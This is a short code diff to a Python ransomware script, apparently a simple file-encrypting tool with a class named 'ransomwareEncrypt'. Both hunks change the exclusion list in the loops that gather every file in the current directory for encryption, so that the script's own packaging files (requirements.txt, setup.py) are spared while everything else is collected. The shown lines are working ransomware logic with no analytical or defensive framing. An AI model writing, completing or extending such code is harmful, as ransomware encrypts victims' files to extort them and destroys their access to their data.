@@ -29,7 +29,7 @@ class ransomwareEncrypt:
             # Create file to compare and check if encryption already exist 
             checkEncryptionFile = open("encryptionCheck.txt", "w+")
             for file in os.listdir():
-                if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'install.bat':
+                if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py':
                     continue
                 if os.path.isfile(file):
                         self.files.append(file)
@@ -84,7 +84,7 @@ class ransomwareEncrypt:
                     continue
                 else:
                     for file in os.listdir():
-                        if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'install.bat':
+                        if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py':
                             continue
                         if os.path.isfile(file):
                             self.files.append(file)
